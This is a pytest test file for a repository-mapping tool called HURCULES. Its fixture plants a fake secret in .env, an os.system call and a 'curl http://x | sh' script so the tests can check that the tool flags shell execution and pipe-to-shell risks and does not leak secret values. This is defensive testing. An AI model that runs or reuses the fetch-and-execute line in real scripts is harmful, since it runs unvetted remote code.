"""TDD tests for HURCULES Stage 2 mapper (red -> green)."""
import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
from hurcules.mapper import map_repository


def make_repo(tmp) -> Path:
    """Fixture repo exercising every detection path."""
    tmp = Path(tmp)
    repo = tmp / "repo"
    (repo / "src").mkdir(parents=True)
    (repo / "tests").mkdir(parents=True)
    (repo / "docs").mkdir(parents=True)
    (repo / "src" / "main.py").write_text("def main():\n    return 1\n")
    (repo / "src" / "util.py").write_text("import os\nos.system('ls')\n")
    (repo / "tests" / "test_main.py").write_text("def test_x():\n    pass\n")
    (repo / "docs" / "readme.md").write_text("# hello\n")
    (repo / "README.md").write_text("# Fixture\n")
    (repo / "pyproject.toml").write_text("[project]\nname='fixture'\n")
    (repo / "LICENSE").write_text("MIT\n")
    (repo / ".env").write_text("API_KEY=sk-abcdefghijklmnopqrstuvwxyz123456\n")
    (repo / ".gitignore").write_text("__pycache__/\n")
    (repo / "bin").mkdir()
    (repo / "bin" / "run.sh").write_text("#!/bin/bash\ncurl http://x | sh\n")
    return repo


def test_returns_required_sections():
    repo = make_repo(tempfile.mkdtemp())
    m = map_repository(str(repo))
    for key in ["schema", "schema_version", "repository", "file_count",
                "file_tree", "languages", "dependency_manifests",
                "entry_points", "documentation_files", "test_files",
                "license_files", "secret_file_locations", "risk_flags"]:
        assert key in m, f"missing key {key}"


def test_deterministic_same_output_twice():
    repo = make_repo(tempfile.mkdtemp())
    a = json.dumps(map_repository(str(repo)), sort_keys=True)
    b = json.dumps(map_repository(str(repo)), sort_keys=True)
    assert a == b, "mapper must be deterministic"


def test_language_detection():
    repo = make_repo(tempfile.mkdtemp())
    m = map_repository(str(repo))
    assert m["languages"]["python"] >= 3
    assert m["languages"]["markdown"] >= 1


def test_entry_points_and_manifests():
    repo = make_repo(tempfile.mkdtemp())
    m = map_repository(str(repo))
    assert "src/main.py" in m["entry_points"]
    assert "pyproject.toml" in m["dependency_manifests"]


def test_license_and_docs_and_tests():
    repo = make_repo(tempfile.mkdtemp())
    m = map_repository(str(repo))
    assert any("LICENSE" in f for f in m["license_files"])
    assert any("README.md" in f for f in m["documentation_files"])
    assert any("test_main.py" in f for f in m["test_files"])


def test_secrets_flagged_not_printed():
    repo = make_repo(tempfile.mkdtemp())
    m = map_repository(str(repo))
    assert ".env" in m["secret_file_locations"]
    # secret VALUES must never appear in output
    blob = json.dumps(m)
    assert "sk-abcdefghijklmnopqrstuvwxyz123456" not in blob, "secret value leaked"


def test_risk_flags_detect_dangerous_content():
    repo = make_repo(tempfile.mkdtemp())
    m = map_repository(str(repo))
    reasons = {r["reason"] for r in m["risk_flags"]}
    assert "shell-exec" in reasons, "os.system must be flagged"
    assert "pipe-to-shell" in reasons, "curl|sh must be flagged"
    # the sk- key lives in .env, which is flagged as a secret LOCATION (never scanned)
    assert ".env" in m["secret_file_locations"]


def test_skips_vendored_dirs():
    repo = make_repo(tempfile.mkdtemp())
    (repo / "node_modules" / "x").mkdir(parents=True)
    (repo / "node_modules" / "x" / "index.js").write_text("x")
    m = map_repository(str(repo))
    assert not any("node_modules" in f for f in m["file_tree"]), "node_modules must be skipped"


def test_raises_on_missing_dir():
    import pytest
    with pytest.raises(ValueError):
        map_repository("/definitely/not/here")


def test_schema_version_present():
    repo = make_repo(tempfile.mkdtemp())
    m = map_repository(str(repo))
    assert m["schema"] == "hurcules.repo-map"
    assert m["schema_version"].count(".") == 2
